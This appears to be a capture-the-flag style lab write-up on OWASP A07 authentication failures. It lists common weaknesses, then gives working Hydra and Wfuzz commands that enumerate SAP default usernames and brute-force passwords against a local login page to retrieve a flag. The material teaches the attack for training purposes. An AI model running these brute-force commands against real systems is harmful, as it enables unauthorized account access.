---
icon: fingerprint
---

# A07 - Identification and Authentication Failures

Weak identification and authentication mechanisms expose systems to identity theft and unauthorized access risks. This category now includes identification vulnerabilities alongside authentication errors.

#### Examples of Identification and Authentication Weaknesses

* Allows automated attacks, such as credential stuffing, where the attacker has a list of valid usernames and passwords.
* Enables brute-force or other automated attacks.
* Allows the use of default, weak, or well-known passwords, like "Password1" or "admin/admin."
* Employs weak or ineffective credential recovery mechanisms, such as knowledge-based answers that are insecure.
* Stores passwords in plain text, with weak encryption, or with weak hashing methods.
* Lacks multi-factor authentication or uses ineffective MFA.
* Exposes session identifiers in the URL.
* Reuses session identifiers after successful login.
* Fails to invalidate session tokens correctly, causing user sessions or authentication tokens (e.g., single sign-on tokens) to persist after logout or idle time.

## Example: Login Page

### Solution

In this scenario, we have an SAP login page that could be vulnerable to brute-force attacks. Using a list of default SAP usernames, we can attempt to find a valid username by brute-forcing with tools like **Hydra** or **Wfuzz**.

**1) Username Enumeration**: Start by fuzzing for valid usernames.

Using **Wfuzz**:

```bash
wfuzz -z file,/usr/share/wordlists/seclists/Usernames/sap-default-usernames.txt -d "username=FUZZ&password=test" http://localhost:8042/login.php
```

Using **Hydra**:

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/sap-default-usernames.txt -p test -s 8042 localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Incorrect username"
```

Once a valid username is found, proceed to brute-force its password.

**2) Password Brute-Forcing**: Use a common password list such as `10-million-password-list-top-100.txt` or `rockyou.txt`.

Using **Wfuzz**:

```bash
wfuzz -z file,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -d "username=<USER>&password=FUZZ" http://localhost:8042/login.php
```

Using **Hydra**:

```bash
hydra -l SOLMAN_ADMIN -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -s 8042 localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Incorrect password"
```

When the correct password is found, the application may reveal it by returning a response of different length or content, allowing you to determine the correct credentials.

**3) One-Command Brute Force with Hydra**: If targeting both usernames and passwords in a single command:

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/sap-default-usernames.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -s 8042 localhost http-post-form "/login.php:username=^USER^&password=^PASS^:Incorrect"
```

Once the correct username and password are found, you gain access to the application and retrieve the flag.
